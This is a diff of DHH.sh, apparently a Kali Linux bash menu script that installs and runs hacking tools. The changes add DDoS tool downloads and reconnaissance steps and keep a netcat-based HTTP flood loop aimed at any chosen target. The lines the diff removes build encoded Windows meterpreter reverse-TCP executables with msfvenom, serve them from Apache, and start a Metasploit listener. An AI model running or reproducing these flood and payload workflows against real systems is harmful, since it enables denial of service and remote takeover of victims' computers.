@@ -1,12 +1,12 @@
 
-#!bin/bash
+#!/bin/bash
 
 #######################################################################################################################
                                                                                                                       #
 ##################                                                                                                    #
 #   intro        # 10/6/2016--21/7/2017                                                                               #
 ##################                                                                                                    #
-                                                                                                                      # 
+                                                                                                                      #
 #############################################################################################################         #
 #                                                                                                           #         #
 # this tool by [->[Oseid Aldary<-][JOKER11]                                                                 #         #
@@ -18,7 +18,7 @@
 #those who do not have enough experience in the Kali Linux system on penetration easily                     #         #
 #This tool is best for [Kali linux]                                                                         #         #
                                                                                                             #         #
-#In order to download the best penetration testing tools                                                    #         # 
+#In order to download the best penetration testing tools                                                    #         #
 #                                                                                                           #         #
 #It will save you a lot of time                                                                             #         #
 #                                                                                                           #         #
@@ -43,7 +43,7 @@
 if [ $(id -u) != "0" ]; then                                #                                                         #
 echo "[*!] we need to be root to run this tool !...  "      #                                                         #
 echo "[*!] type [ sudo ./DHH.sh ] on your terminal"         #                                                         #
-exit                                                        #                                                         #
+exit 0                                                      #                                                         #
 else                                                        #                                                         #
 echo "root user" > /dev/null 2>&1                           #                                                         #
 fi                                                          #                                                         # 
@@ -51,12 +51,12 @@ fi                                                          #                   
 #############################################################                                                         #
                                                                                                                       #
 ########## Configure colors ###########                                                                               #
-                                      #                                                                               #                  
-RED=$(tput setaf 1 && tput bold)      #                                                                               #                  
-GREEN=$(tput setaf 2 && tput bold)    #                                                                               #                  
-white=$(tput sgr0)                    #                                                                               #                  
-BLUE=$(tput setaf 6 && tput bold)     #                                                                               #                  
-                                      #                                                                               #                  
+                                      #                                                                               #
+RED=$(tput setaf 1 && tput bold)      #                                                                               #
+GREEN=$(tput setaf 2 && tput bold)    #                                                                               #
+white=$(tput sgr0)                    #                                                                               #
+BLUE=$(tput setaf 6 && tput bold)     #                                                                               #
+                                      #                                                                               #
 #######################################                                                                               #
                                                                                                                       #
 ################################ CONFIGURATIONS #######################################                               #
@@ -98,21 +98,14 @@ echo                                              #                             
 echo -n "Do you want exit !? [Y/N] : "            #                                                                   #
 read exite                                        #                                                                   #
 if [[ $exite = Y || $exite = y ]];then            #                                                                   #
-                                                  #                                                                   # 
-echo "" $GREEN                                    #                                                                   #
 echo                                              #                                                                   #
 echo                                              #                                                                   #
-echo "thanks for using"                           #                                                                   #
-sleep 2                                           #                                                                   #
 echo "" $RED                                      #                                                                   #
-echo "see you letar"                              #                                                                   #
-sleep 1                                           #                                                                   #
+echo "See You Letar"                              #                                                                   #
+sleep 2                                           #                                                                   #
 echo                                              #                                                                   #
-echo "" $BLUE                                     #                                                                   #
-echo "goodbye :) "                                #                                                                   #
-sleep 1                                           #                                                                   #
 clear                                             #                                                                   #
-exit 1                                            #                                                                   #
+exit 0                                            #                                                                   #
 else                                              #                                                                   #
 clear                                             #                                                                   #
 ./DHH.sh                                          #                                                                   #
@@ -185,15 +178,15 @@ cat << !
 $RED
 #####################################$BLUE WHAT IS DHH TOOL$RED ########################################$GREEN
                                                                                               $BLUE#$GREEN
-DHH she a tool that has been programmed To help hackers on penetration and she also helps     $BLUE#$GREEN                
-those who do not have enough experience in the Kali Linux system on penetration easily        $BLUE#$GREEN             
-This tool is best for [Kali linux]                                                            $BLUE#$GREEN  
-In order to download the best penetration testing tools                                       $BLUE#$GREEN                           
-It will save you a lot of time                                                                $BLUE#$GREEN  
-The tool is under constant development :)                                                     $BLUE#$GREEN  
-and will soon be the best for download hacking tools and penetration                          $BLUE#$GREEN  
-                                                                                              $BLUE#$RED  
-#############################################                                                 $BLUE#$GREEN    
+DHH she a tool that has been programmed To help hackers on penetration and she also helps     $BLUE#$GREEN
+those who do not have enough experience in the Kali Linux system on penetration easily        $BLUE#$GREEN
+This tool is best for [Kali linux]                                                            $BLUE#$GREEN
+In order to download the best penetration testing tools                                       $BLUE#$GREEN
+It will save you a lot of time                                                                $BLUE#$GREEN
+The tool is under constant development :)                                                     $BLUE#$GREEN
+and will soon be the best for download hacking tools and penetration                          $BLUE#$GREEN
+                                                                                              $BLUE#$RED
+#############################################                                                 $BLUE#$GREEN
 this tool by [->[$RED Oseid Aldary$GREEN ]<-][JOKER11]$RED#$RED                                                 $BLUE#$RED
 #############################################                                                 $BLUE#
 $BLUE                                                                                              #
@@ -201,7 +194,7 @@ $BLUE                                                                           
 For Help Please Visit My Account$RED{https://www.facebook.com/profile.php?id=100017170449859}     $BLUE#
                                                                                               #
 and tell me what the problem is $BLUE                                                              #
-############################################################################################### 
+###############################################################################################
 
 !
 read -p "Press Enter to back "
@@ -220,7 +213,7 @@ $RED
 ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗█████╗██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
 ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝╚════╝██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
 ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗    ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
- ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
+ ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝
 $GREEN
 ================================================================================================
 !
@@ -242,13 +235,14 @@ echo $RED"                   *    9 .  install vokoscreen          *";
 echo $RED"                   *   10 .  Update aircrack-ng          *";
 echo $RED"                   *   11 .  install VPN pptp            *";
 echo $RED"                   *   12 .  install terminator          *";
-echo $RED"                   *   13 .  install bwapp               *";
-echo $RED"                   *   14 .  install dvwa                *";
+echo $RED"                   *   13 .  install bwapp lab           *";
+echo $RED"                   *   14 .  install dvwa  lab           *";
 echo $RED"                   *   15 .  install VirtualBox          *";
 echo $RED"                   *   16 .  install RecordMyDesktop     *";
 echo $RED"                   *   17 .  install ftp-server          *";
 echo $RED"                   *   18 .  Update Metasploit           *";
-echo $RED"                   *   19 .  Return to Main Menu         *";
+echo $RED"		   *   19 .  install vmware-manager      *";
+echo $RED"                   *   20 .  Return to Main Menu         *";
 echo $RED"                   ***************************************";
 echo "" $BLUE
 echo -n "Enter choice ->> "$RED
@@ -273,7 +267,7 @@ sleep 3
 clear
 ./DHH.sh
 echo
-fi 
+fi
 	if [[ $rer = n || $rar = N ]];then
 	echo
 	clear
@@ -382,7 +376,7 @@ sleep 3
 clear
 echo
 echo
-	echo $GREEN"[!]you are not connect to the internet ! "$BLUE	
+	echo $GREEN"[!]you are not connect to the internet ! "$BLUE
 echo
 	echo "[!]please Connect to the internet and try again :) "
 echo
@@ -396,7 +390,7 @@ echo
 echo $RED"========update and clean kali for you========"
 sleep 4
 echo "[*]working.........."
-sleep 1 
+sleep 1
 sudo apt-get -y update && apt-get -y clean
 echo $GREEN"[*]Finishing....."
 sleep 7
@@ -642,7 +636,7 @@ echo
 echo
 echo $GREEN"[!]you not connect to the internet ! "$BLUE
 echo
-echo "[!]please Connect to the internet and try again :) " 
+echo "[!]please Connect to the internet and try again :) "
 echo
 exit
 fi
@@ -655,13 +649,13 @@ echo
 echo $RED"=====install VPN PPTP for you======"
 sleep 4
 echo "[*]working...."
-sleep 1 
-sudo apt-get -y install network-manager-pptp network-manager-pptp-gnome 
+sleep 1
+sudo apt-get -y install network-manager-pptp network-manager-pptp-gnome
 echo $GREEN"[*]Finishing....."
 sleep 7
 clear
 ./DHH.sh
-else 
+else
 if [ $my = 12 ];then 
 clear
 echo
@@ -891,11 +885,11 @@ clear
         fi
 
 else
-if [ $my = 17 ];then 
+if [ $my = 17 ];then
 clear
 echo
 echo "checking $RED[internet]$BLUE connections$RED........"
-echo 
+echo
   ping -c 1 google.com > /dev/null 2>&1
   if [ "$?" != 0 ]
 
@@ -947,7 +941,7 @@ echo
 echo
 echo $GREEN"[!]you not connect to the internet ! "$BLUE
 echo
-echo "[!]please Connect to the internet and try again :) " 
+echo "[!]please Connect to the internet and try again :) "
 echo
 exit
 fi
@@ -957,7 +951,7 @@ sleep 2
 clear
 echo
 echo
-	
+
 				echo $RED "====== Updating metasploit for you ======"
 				sleep 2
 				git clone https://github.com/rapid7/metasploit-framework.git /opt/exploitation/metasploit/
@@ -977,7 +971,43 @@ clear
 else
 if [ $my = 19 ];then
 clear
+echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+echo 
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) "
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 1
+clear
+echo
+echo
+echo $RED"========install vmware-manager for you==========="
+sleep 4
+echo "working..........."
+sleep 1
+apt-get -y install vmware-manager
+echo  $GREEN"[*]Finishing......"
+sleep 7
+clear
 ./DHH.sh
+else
+if [ $my = 20 ];then
+clear
+./DHH.sh
+fi
 fi
 fi
 fi
@@ -3194,8 +3224,9 @@ echo $BLUE"              # 3 >    install hammer          #";
 echo $BLUE"              # 4 >    install slowloris       #";
 echo $BLUE"              # 5 >    install DDOSAR2         #";
 echo $BLUE"              # 6 >    install torshammer      #";
-echo $BLUE"              # 7 >    Dos-Attack-Tool         #";
-echo $BLUE"              # 8 >    Return to Main Menu     #";
+echo $BLUE"              # 7 >    install Dos-Power       #";
+echo $BLUE"              # 8 >    install Anonymous-DDoS  #";
+echo $BLUE"              # 9 >    Return to Main Menu     #";
 echo $RED "             #================================#";
 echo "" $BLUE
 echo -n "Enter choice ->> "$RED
@@ -3443,12 +3474,12 @@ sleep 1
 clear
 echo
 echo
-echo $RED"========install Dos-Attack-Tool for you========"
+echo $RED"========install Dos-Power for you========"
 sleep 4
 echo
 echo "[*]working....."
 sleep 1
-git clone https://github.com/Oseid/Dos-Attack-Tool.git
+git clone https://github.com/Oseid/Dos-Power.git
 echo "[*]Finishing....."
 sleep 7
 clear
@@ -3456,7 +3487,43 @@ clear
 else
 if [ $www = 8 ];then
 clear
+echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+echo
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo $BLUE"[*]$GREEN[ CONNECT ]"
+sleep 1
+clear
+echo
+echo
+echo $RED  "==========install Anonymous-DDoS for you======== "
+sleep 4
+echo "[*]working....."
+sleep 1
+git clone https://github.com/Oseid/Anonymous-DDos.git
+echo "[*]Finishing....."
+sleep 7
+clear
 ./DHH.sh
+else
+if [ $www = 9 ];then
+clear
+./DHH.sh
+fi
 fi
 fi
 fi
@@ -3484,7 +3551,6 @@ $RED
 |  _    ||    ___|  |   |  |       ||  |_|  ||    __  ||     |_          |   |  |  |_|  ||  |_|  ||   |___ |_____  |
 | | |   ||   |___   |   |  |   _   ||       ||   |  | ||    _  |         |   |  |       ||       ||       | _____| |
 |_|  |__||_______|  |___|  |__| |__||_______||___|  |_||___| |_|         |___|  |_______||_______||_______||_______|
-
 $GREEN
 =====================================================================================================================
 !
@@ -5144,15 +5210,15 @@ INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value betw
 clear
 echo 
 echo
-echo $GREEN"Attack has been started on $BLUE [[$RED>$BLUE $TARGET $RED<$BLUE]]"
+echo $GREEN"Attack Has been Start On $BLUE [[$RED>$BLUE $TARGET $RED<$BLUE]]"
 sleep 3
 echo ""$RED
 	i=1
 	while [ "$i" -le "$CONNS" ]; do
-echo "Attcking start on $BLUE $TARGET$RED..........$GREEN $i,$RED $INTERVAL "; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Attacking start on $BLUE $TARGET$RED..........$GREEN $i,$RED interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo
 echo "" $BLUE
-echo "The attack was completed on [[$RED>$GREEN $TARGET $RED<$BLUE]]$RED >>$BLUE $CONNS $RED attacks Done <<"
+echo "The Attack Was Completed On [[$RED>$GREEN $TARGET $RED<$BLUE]]$RED >>${GREEN}And$BLUE $CONNS $RED Attacks Were Sent! <<"
 echo
 echo "" $GREEN
 read -p "press Enter to back to the menu "
@@ -5807,6 +5873,34 @@ else
 if [ $word = 9 ];then
 clear
 echo
+cat << !
+$RED 
+                                                                                                                               
+ # #    # ######  ####  #####  #    #   ##   ##### #  ####  #    #     ####    ##   ##### #    # ###### #####  # #    #  ####  
+ # ##   # #      #    # #    # ##  ##  #  #    #   # #    # ##   #    #    #  #  #    #   #    # #      #    # # ##   # #    # 
+ # # #  # #####  #    # #    # # ## # #    #   #   # #    # # #  #    #      #    #   #   ###### #####  #    # # # #  # #      
+ # #  # # #      #    # #####  #    # ######   #   # #    # #  # #    #  ### ######   #   #    # #      #####  # #  # # #  ### 
+ # #   ## #      #    # #   #  #    # #    #   #   # #    # #   ##    #    # #    #   #   #    # #      #   #  # #   ## #    # 
+ # #    # #       ####  #    # #    # #    #   #   #  ####  #    #     ####  #    #   #   #    # ###### #    # # #    #  #### $GREEN
+====================================================================================
+!
+echo $RED                  "**************************************";
+echo $RED                  "*    1.  WHOIS Target                *";
+echo $RED                  "*    2.  Dig and host list           *";
+echo $RED                  "*    3.  TCP traceroute              *";
+echo $RED                  "*    4.  DNS enumeration             *";
+echo $RED                  "*    5.  DNS RECON                   *";
+echo $RED                  "*    6.  Fierce                      *";
+echo $RED                  "*    7.  Nmap                        *"; 
+echo $RED                  "*    8.  Enumerate ALL               *"; 
+echo $RED                  "*    9.  back to menu                *"; 
+echo $RED                  "**************************************";
+echo "" $BLUE
+echo -n " Enter choice -->> "$RED
+read menuoption
+echo
+if [ $menuoption = 1 ]; then
+echo
 echo "checking $RED[internet]$BLUE connections$RED........"
   ping -c 1 google.com > /dev/null 2>&1
   if [ "$?" != 0 ]
@@ -5827,39 +5921,11 @@ echo "$BLUE[*] $GREEN[ CONNECT ]"
 sleep 2
 clear
 echo
-cat << !
-$RED
- _        __                            _   _                               _   _               _             
-(_)_ __  / _| ___  _ __ _ __ ___   __ _| |_(_) ___  _ __         __ _  __ _| |_| |__   ___ _ __(_)_ __   __ _ 
-| | '_ \| |_ / _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \ _____ / _` |/ _` | __| '_ \ / _ \ '__| | '_ \ / _` |
-| | | | |  _| (_) | |  | | | | | | (_| | |_| | (_) | | | |_____| (_| | (_| | |_| | | |  __/ |  | | | | | (_| |
-|_|_| |_|_|  \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_|      \__, |\__,_|\__|_| |_|\___|_|  |_|_| |_|\__, |
-                                                                |___/                                   |___/ 
-$GREEN
-=================================================================================================================
-!
-echo ""
-echo $RED"                   **************************************";
-echo $RED"                   *    1.  WHOIS Target                *";
-echo $RED"                   *    2.  Dig and host list           *";
-echo $RED"                   *    3.  TCP traceroute              *";
-echo $RED"                   *    4.  DNS enumeration             *";
-echo $RED"                   *    5.  DNS RECON                   *";
-echo $RED"                   *    6.  Fierce                      *";
-echo $RED"                   *    7.  Nmap                        *"; 
-echo $RED"                   *    8.  Enumerate ALL               *"; 
-echo $RED"                   *    9.  back to menu                *"; 
-echo $RED"                   **************************************";
-echo "" $BLUE
-echo -n " Enter choice -->> "$RED
-read menuoption
-echo
-if [ $menuoption = 1 ]; then
-echo
 echo "" $GREEN
 echo -n "Enter target domain EG. domain.org[:>"$RED
 read target
-clear
+echo "" $RED
+echo "================== INFO =================="
 echo "" $BLUE
 whois $target
 echo "" $RED
@@ -5874,6 +5940,26 @@ clear
 else
 
 if [ $menuoption = 2 ]; then
+echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
+clear
 echo
 echo "" $GREEN
 echo -n "Enter target domain EG. domain.org[:>"$RED
@@ -5896,6 +5982,26 @@ clear
 else
 if [ $menuoption = 3 ]; then
 echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
+clear
+echo
 echo "" $GREEN
 echo -n "Enter target domain EG. domain.org[:>"$RED
 read target
@@ -5915,6 +6021,26 @@ clear
 else
 if [ $menuoption = 4 ]; then
 echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
+clear
+echo
 echo "" $GREEN
 echo -n "Enter target domain EG. domain.org[:>"$RED
 read target
@@ -5931,6 +6057,26 @@ clear
 ./DHH.sh
 else
 if [ $menuoption = 5 ];then
+echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
+clear
 echo
 echo "" $GREEN
 echo -n "Enter target domain EG. domain.org[:>"$RED
@@ -5949,6 +6095,26 @@ clear
 else
 if [ $menuoption = 6 ]; then
 echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
+clear
+echo
 echo "" $GREEN
 echo -n "Enter target domain EG. domain.org[:>"$RED
 read target
@@ -5966,6 +6132,26 @@ clear
 else
 if [ $menuoption = 7 ]; then
 echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
+clear
+echo
 echo $BLUE"Enter target domain EG. domain.org"$RED
 echo
 read target
@@ -5982,6 +6168,25 @@ clear
 ./DHH.sh
 else
 if [ $menuoption = "8" ]; then
+echo
+echo "checking $RED[internet]$BLUE connections$RED........"
+  ping -c 1 google.com > /dev/null 2>&1
+  if [ "$?" != 0 ]
+
+then
+sleep 3
+clear
+echo
+echo
+echo $GREEN"[!]you not connect to the internet ! "$BLUE
+echo
+echo "[!]please Connect to the internet and try again :) " 
+echo
+exit
+fi
+echo
+echo "$BLUE[*] $GREEN[ CONNECT ]"
+sleep 2
 clear
 echo
 echo
@@ -5998,7 +6203,9 @@ dig $target any
 echo ""$RED
 echo "##########################################################################################"
 echo "" $BLUE
-host -l $target
+host -a $target
+echo $RED"---------------------"$BLUE
+host -C $target
 echo ""$RED
 echo "##########################################################################################"
 echo "" $BLUE
@@ -6032,18 +6239,6 @@ echo "##########################################################################
 echo "" $BLUE
 nmap -PN -n -F -T4 -sV -A -oG $target.txt $target
 echo ""$RED
-echo "##########################################################################################"
-echo "" $BLUE
-amap -i $target.txt
-echo ""
-echo ""
-sudo apt-get -y install httprint
-echo ""$GREEN
-echo "##########################################################################################"
-echo ""
-echo "" $RED
-httprint -h www.$target -s signatures.txt -P0
-echo ""
 echo "" $BLUE
 echo "###################################### Done ALL  ##########################################"
 sleep 2
@@ -8081,4650 +8276,9 @@ while true; do homenu; done
 else
 
 if [ $word = 18 ];then
-clear $BLUE
-echo
-echo "Please wait..............." 
-echo
-GAT=`ip route | grep "static" | awk {'print $3'}`  
-In=`netstat -r | grep "default" | awk {'print $8'}`
-Qu=$(zenity --question --title "Do you use this interface ?" --text "-:[ $In ? ]:-" --width 300) > /dev/null 2>&1
-     if [ "$?" -eq "0" ]; then
-       inter="$In"
-
-else
-
-  zenity --info --title="INTERFACE -> ABORTED" --text "Please check your network connection\nor manually input your interface in use" --width 350 > /dev/null 2>&1
-  echo ${GREEN}[*]${RED}:${GREEN}[Available Network Interfaces]: ${RED};
-  echo ""
-  cat /proc/net/dev | tr -s  ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
-  echo ""
-  inter=$(zenity --title="Enter interface in use" --text "example: wlan0 Or eth0" --entry --width 300) > /dev/null 2>&1
-
-fi
-
-
-
-
-EE=YES
-
-if [ $EE = NO ];then
-myip2=Security
-else
-myip2=`wget -q -O - checkip.dyndns.org | sed -e 's/[^[:digit:]|.]//g'`
-fi
-
 clear
-echo "" $BLUE
-echo "checking if $RED[METASPLOIT]$BLUE exists$RED........"
-sleep 2
-echo
-if [ -f /usr/bin/msfconsole ];then 
-echo "$BLUE[*]$RED:$BLUE[Metasploit]:${white}installation found...$BLUE"
-sleep 2
-else
-th=this
-echo
-echo "$RED[!]${GREEN}Metasploit is not installation "
-echo
-echo $RED[x]:[waring]:$BLUE$th module needs $RED[Metasploit]$BLUE to work
-echo ""$GREEN
-echo ""
-echo -n "Do you want install Metasploit ?$RED [Y/N] :$BLUE "
-read meta
-if [[ $meta = Y || $meta = y ]];then
-clear
-echo
-echo $RED
-echo "=========== install Metasploit for you ==========="
-sleep 4
-echo "[*]working........."
-sleep 1
-apt-get -y install metasploit-framework
-echo
-echo $GREEN"Done! Metasploit has been installed !"
-echo
-read -p "now press Enter to continue :)"
-clear
-else
-if [[ $meta = N || $meta = n ]];then
-clear
-./DHH.sh
-fi
-fi
-fi
-echo ""$BLUE
-echo "checking if $RED[MSFVENOM]$BLUE exists$RED........"
-sleep 2
-echo
-if [ -f /usr/bin/msfvenom ];then
-   echo $BLUE[*]$RED:$BLUE[Msfvenom]:${white}installation found...$BLUE
-sleep 1 
-  
-else
-th=this
-echo
-echo"$RED[!]${GREEN}Msfvenom is not installation "
-echo
-echo $RED[x]:[waring]:$BLUE$th module needs $RED[Msfvenom]$BLUE to work
-echo
-pl=please
-echo $BLUE[*]$RED:$BLUE$pl install $RED[Msfvenom]$BLUE and try again ":)" 
-   sleep 4
-   exit
-   
-
-fi
-echo
-echo "checking if $RED[APACHE SERVER]$BLUE exists$RED........"
-echo
-sleep 2
-if [ -d /var/www/html ];then
-echo $BLUE[*]$RED:$BLUE[Apache]:${white}installation found...
-   sleep 1
-else
-
-th=this
-echo
-echo "$RED[!]${GREEN}Apache Server is not installation "  
-echo
-echo $RED[x]:[waring]:$BLUE$th module needs $RED[Apache server]$BLUE to work
-echo
-echo
-echo -n "Do you want install Apache Server  ?$RED [Y/N] :$BLUE "
-read apac
-if [[ $apac = Y || $apac = y ]];then
-clear
-echo
-echo $RED
-echo "=========== install Apache Server for you ==========="
-sleep 4
-echo "[*]working........."
-sleep 1
-apt-get -y install apache2 
-echo
-echo $GREEN"Done! Apache Server has been installed !"
-echo
-read -p "now press Enter to continue :)"
-clear
-else
-if [[ $apac = N || $apac = n ]];then
-clear
-./DHH.sh
-fi
-fi
-fi
-echo "" $BLUE
-echo "checking $RED[internet]$BLUE connections$RED........"
-sleep 2
-  ping -i 01 -c 1 google.com > /dev/null 2>&1
-  if [ "$?" != 0 ]
-then
-sleep 3
-clear
-echo
-echo "$RED[!]$BLUE You Are Not Connect To The Internet"
-echo
-echo "$RED[*]warning[$GREEN This Modules need to connect to the internet ] "$BLUE
-echo
-echo -n "Do You Want continue without the Internet ?$RED [Y/N]$GREEN : "
-read net
-if [[ $net = N || $net = n ]];then
-clear
-echo
-echo "" $BLUE
-echo "[!]Please Connect To The Internet And Try Again :) "
-echo
-exit
-else
-if [[ $net = Y || $net = y ]];then
-clear
-myip=?
-myip2=?
-In=?
-GAT=?
-fi
-fi
-else
-echo
-echo $BLUE[*]$RED:$BLUE[Internet]:$GREEN[CONNECT Fonud$white...$GREEN]
-sleep 1
-echo
-echo "" $GREEN
-echo "Welcome to $RED[-> [ Exploitation platform ] <-]" 
-sleep 3
-fi
-
-clear
-
-winre () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-winhtt () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
